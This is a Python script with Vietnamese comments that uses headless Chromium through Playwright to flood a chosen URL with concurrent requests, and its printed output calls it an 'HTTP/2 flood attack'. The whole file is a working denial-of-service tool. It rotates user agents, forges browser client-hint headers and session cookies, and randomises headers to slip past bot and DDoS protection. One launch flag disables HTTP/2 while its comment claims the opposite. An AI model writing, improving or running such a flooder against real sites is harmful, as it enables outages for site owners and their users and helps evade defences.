import asyncio
import random
import time
import os
from playwright.async_api import async_playwright

TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
DURATION = int(os.getenv("DURATION", "20"))   # giây
CONCURRENCY = int(os.getenv("CONCURRENCY", "30"))  # số tab song song
REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "5"))  # số request song song mỗi vòng/tab

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]
ACCEPT_LANG = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja,en;q=0.8"]

# Headers tin cậy hoàn chỉnh cho HTTP/2
TRUSTED_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
    "Sec-Gpc": "1",
    "Dnt": "1"
}

success = 0
fail = 0
status_count = {}

async def attack(playwright, worker_id):
    global success, fail, status_count

    ua = random.choice(USER_AGENTS)
    lang = random.choice(ACCEPT_LANG)
    
    # Chuẩn bị headers với Accept-Language ngẫu nhiên
    headers = TRUSTED_HEADERS.copy()
    headers["Accept-Language"] = lang
    
    # Xác định platform dựa trên User-Agent
    if "Windows" in ua:
        headers["Sec-Ch-Ua-Platform"] = '"Windows"'
    elif "Macintosh" in ua:
        headers["Sec-Ch-Ua-Platform"] = '"macOS"'
    elif "Linux" in ua or "X11" in ua:
        headers["Sec-Ch-Ua-Platform"] = '"Linux"'
    
    # Cập nhật Sec-Ch-Ua dựa trên trình duyệt
    if "Chrome" in ua:
        chrome_version = "120"  # Version mặc định
        if "Chrome/" in ua:
            try:
                chrome_version = ua.split("Chrome/")[1].split(".")[0]
            except:
                pass
        headers["Sec-Ch-Ua"] = f'"Google Chrome";v="{chrome_version}", "Chromium";v="{chrome_version}", "Not=A?Brand";v="99"'
    elif "Firefox" in ua:
        ff_version = "121"  # Version mặc định
        if "Firefox/" in ua:
            try:
                ff_version = ua.split("Firefox/")[1].split(".")[0]
            except:
                pass
        headers["Sec-Ch-Ua"] = f'"Firefox";v="{ff_version}"'
        # Firefox không dùng một số headers này
        headers.pop("Sec-Ch-Ua-Mobile", None)
        headers.pop("Sec-Ch-Ua-Platform", None)
    
    # Cấu hình trình duyệt với HTTP/2
    browser = await playwright.chromium.launch(
        headless=True,
        args=[
            "--disable-web-security",
            "--disable-features=IsolateOrigins,site-per-process",
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--enable-features=NetworkService,NetworkServiceInProcess",  # Hỗ trợ HTTP/2 tốt hơn
            "--disable-quic",  # Ưu tiên HTTP/2 thay vì QUIC
            "--allow-insecure-localhost",
            "--ignore-certificate-errors",
            "--disable-http2",  # Đảm bảo HTTP/2 được bật (tên hơi ngược nhưng đúng)
        ]
    )
    
    # Tạo context với HTTP/2 enabled
    context = await browser.new_context(
        user_agent=ua,
        extra_http_headers=headers,
        ignore_https_errors=True,
        java_script_enabled=True,
        bypass_csp=True,
        viewport={'width': 1920, 'height': 1080},
        device_scale_factor=random.uniform(1.0, 2.0),
        is_mobile=False,
        has_touch=False,
        color_scheme='light',
        reduced_motion='no-preference',
        accept_downloads=False,
    )

    # Thêm cookies ngẫu nhiên để tăng tính thực tế
    await context.add_cookies([
        {
            'name': 'session',
            'value': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32)),
            'domain': TARGET_URL.split('//')[1].split('/')[0],
            'path': '/',
            'httpOnly': True,
            'secure': True,
            'sameSite': 'Lax'
        }
    ])

    start = time.time()
    request_count = 0
    
    while time.time() - start < DURATION:
        tasks = []
        for _ in range(REQ_PER_LOOP):
            # Thêm một số biến thể nhỏ trong headers để tránh pattern
            request_headers = headers.copy()
            request_headers["Accept"] = random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            ])
            
            # Randomize cache control
            request_headers["Cache-Control"] = random.choice([
                "max-age=0",
                "no-cache",
                "no-store, no-cache, must-revalidate, max-age=0"
            ])
            
            # Thêm referer ngẫu nhiên (có thể là trang chính hoặc không)
            if random.random() > 0.3:
                request_headers["Referer"] = TARGET_URL
                request_headers["Sec-Fetch-Site"] = random.choice(["same-origin", "same-site"])
            
            tasks.append(
                context.request.get(
                    TARGET_URL,
                    headers=request_headers,
                    timeout=15000,  # Tăng timeout cho HTTP/2
                    fail_on_status_code=False  # Không throw exception trên status code lỗi
                )
            )
        
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            request_count += len(results)

            for res in results:
                if isinstance(res, Exception):
                    fail += 1
                    ex_type = type(res).__name__
                    status_count[ex_type] = status_count.get(ex_type, 0) + 1
                else:
                    status = res.status
                    if 200 <= status < 300:
                        success += 1
                    else:
                        fail += 1
                    status_count[status] = status_count.get(status, 0) + 1
                    
                    # Đọc response body để hoàn tất request (quan trọng với HTTP/2)
                    try:
                        await res.body()
                    except:
                        pass
                    
                    await res.dispose()  # Giải phóng tài nguyên
            
            # Delay ngẫu nhiên giữa các batch
            if random.random() > 0.7:
                await asyncio.sleep(random.uniform(0.1, 0.5))
                
        except Exception as e:
            fail += REQ_PER_LOOP
            ex_type = type(e).__name__
            status_count[ex_type] = status_count.get(ex_type, 0) + REQ_PER_LOOP

    await browser.close()
    return request_count

async def main():
    print(f"Starting HTTP/2 flood attack on {TARGET_URL}")
    print(f"Duration: {DURATION}s | Concurrency: {CONCURRENCY} | Requests per batch: {REQ_PER_LOOP}")
    print("Using realistic HTTP/2 headers with Chromium...")
    
    async with async_playwright() as p:
        tasks = [attack(p, i) for i in range(CONCURRENCY)]
        results = await asyncio.gather(*tasks)
        total_requests = sum(results)

    total = success + fail
    print(f"\n{'='*50}")
    print(f"=== HTTP/2 Flood Attack Results ===")
    print(f"{'='*50}")
    print(f"Target URL: {TARGET_URL}")
    print(f"Attack Duration: {DURATION} seconds")
    print(f"Total Workers: {CONCURRENCY}")
    print(f"{'='*50}")
    print(f"Total Requests Sent: {total}")
    print(f"Successful (2xx): {success}")
    print(f"Failed/Blocked: {fail}")
    print(f"Average RPS: {total / DURATION:.2f}")
    print(f"Estimated Throughput: {(total * 1024) / DURATION / 1024:.2f} KB/s")  # Ước tính
    
    print(f"\nStatus Code Distribution:")
    for code, count in sorted(status_count.items()):
        if isinstance(code, int):
            print(f"  HTTP {code}: {count} requests ({count/total*100:.1f}%)")
        else:
            print(f"  {code}: {count} exceptions")
    
    print(f"\nAttack completed at: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*50}")

if __name__ == "__main__":
    # Thiết lập event loop cho hiệu suất cao
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    
    asyncio.run(main())
